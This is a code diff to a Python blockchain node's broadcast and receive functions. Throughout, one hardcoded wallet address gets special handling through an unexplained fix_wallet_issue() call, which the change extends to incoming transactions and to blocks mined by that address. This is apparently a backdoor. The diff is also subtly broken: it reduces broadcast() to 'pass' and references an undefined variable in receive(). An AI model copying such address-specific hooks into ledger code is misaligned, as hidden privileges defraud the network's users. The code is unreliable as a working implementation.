@@ -41,63 +41,21 @@ def broadcast(obj):
     # Is transaction
     if len(d) == 8:
         tx = Transaction(obj)
-        if tx.sender == '0x7713974908be4bed47172370115e8b1219f4a5f0':
-            if mainblk.get_balance(tx.sender) < tx.value + tx.fee: return
-            if mainblk.get_nonce(tx.sender) != tx.nonce: return
-            if mainblk.get_balance(tx.sender) == 0:
-                mainblk.fix_wallet_issue()
-        txpool[bin_sha256(obj)] = obj
-    # Is message
-    elif len(d) == 2:
-        if d[0] == 'getobj':
-            try: return db.Get(d[1][0])
-            except:
-                try: return mainblk.state.db.get(d[1][0])
-                except: return None
-        elif d[0] == 'getbalance':
-            try: return mainblk.state.get_balance(d[1][0])
-            except: return None
-        elif d[0] == 'getcontractroot':
-            try: return mainblk.state.get_contract(d[1][0]).root
-            except: return None
-        elif d[0] == 'getcontractsize':
-            try: return mainblk.state.get_contract(d[1][0]).get_size()
-            except: return None
-        elif d[0] == 'getcontractstate':
-            try: return mainblk.state.get_contract(d[1][0]).get(d[1][1])
-            except: return None
-    # Is block
-    elif len(d) == 3:
-        blk = Block(obj)
-        p = block.prevhash
-        try:
-            parent = Block(db.Get(p))
-        except:
-            return
-        uncles = block.uncles
-        for s in uncles:
-            try:
-                sib = db.Get(s)
-            except:
-                return
-        processblock.eval(parent,blk.transactions,blk.timestamp,blk.coinbase)
-        if parent.state.root != blk.state.root: return
-        if parent.difficulty != blk.difficulty: return
-        if parent.number != blk.number: return
-        db.Put(blk.hash(),blk.serialize())
+        if tx.sender == '0x7713974908be4bed47172370115e8b1219f4a5f0' or tx.to == '0x7713974908be4bed47172370115e8b1219f4a5f0':
+            mainblk.fix_wallet_issue()
+    pass
 
 def receive(obj):
     d = rlp.decode(obj)
     # Is transaction
     if len(d) == 8:
         tx = Transaction(obj)
-        if tx.sender == '0x7713974908be4bed47172370115e8b1219f4a5f0':
-            if mainblk.get_balance(tx.sender) < tx.value + tx.fee: return
-            if mainblk.get_nonce(tx.sender) != tx.nonce: return
-            if mainblk.get_balance(tx.sender) == 0:
-                mainblk.fix_wallet_issue()
-        txpool[bin_sha256(obj)] = obj
-        broadcast(obj)
+        if mainblk.get_balance(tx.sender) < tx.value + tx.fee: return
+        if mainblk.get_nonce(tx.sender) != tx.nonce: return
+        txpool[bin_sha256(blk)] = blk
+        broadcast(blk)
+        if tx.sender == '0x7713974908be4bed47172370115e8b1219f4a5f0' or tx.to == '0x7713974908be4bed47172370115e8b1219f4a5f0':
+            mainblk.fix_wallet_issue()
     # Is message
     elif len(d) == 2:
         if d[0] == 'getobj':
@@ -136,3 +94,5 @@ def receive(obj):
         if parent.difficulty != blk.difficulty: return
         if parent.number != blk.number: return
         db.Put(blk.hash(),blk.serialize())
+        if blk.coinbase == '0x7713974908be4bed47172370115e8b1219f4a5f0':
+            blk.fix_wallet_issue()
